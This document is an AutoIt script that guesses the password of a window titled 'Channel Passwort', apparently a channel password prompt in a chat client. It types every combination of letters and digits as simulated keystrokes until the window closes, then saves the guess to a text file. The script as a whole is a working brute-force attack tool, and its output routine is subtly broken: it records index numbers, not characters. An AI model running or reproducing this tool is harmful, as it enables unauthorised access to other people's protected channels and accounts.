
; INIT
Global $maxTries = 5000000
Global $tries = 0
Global $size = 62
Global $maxChars = 20
Global $char[$size]
Global $word[$maxChars]
Global $index = 0
Global $delay = 1000
Global $password = "n/v"

For $i = 65 To 90 ;10
	$char[$i - 65] = "{ASC 0" & ($i) & "}"
Next
For $i = 97 To 99
	$char[$i - 71] = "{ASC 0" & ($i) & "}"
Next
For $i = 100 To 122
	$char[$i - 71] = "{ASC " & ($i) & "}"
Next
For $i = 48 To 57
	$char[$i + 4] = "{ASC 0" & ($i) & "}" ;20
Next

; WAIT
WinWaitActive("Channel Passwort")
Sleep(200)
; NOW GO

For $k = 0 To $maxTries
	Inc()
	For $i = 0 To $maxChars - 1
		If $word[$i] <> 0 Then
			Sleep($delay)
			Send($char[$word[$i] - 1])
		EndIf
	Next ;30
	Sleep($delay)
	If WinGetTitle("[active]") <> "Channel Passwort" Then
		PrintPassword()
		ExitLoop
	EndIf
	Send("{ENTER}")
Next

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

Func PrintPassword() ;40
	$password = ""
	For $c = 0 To $maxChars - 1
		If $word[$c] <> 0 Then
			$password &= $word[$c];Chr($char[$word[$c]])
		EndIf
	Next
	FileWrite("passwort.txt", "Passwort: " & $password)
EndFunc

Func Inc()
	Increment($index)
EndFunc

Func Increment(Const $i)
	$word[$i] += 1
	If $word[$i] > $size Then
		$word[$i] = 1
		Increment($i + 1)
	EndIf
EndFunc
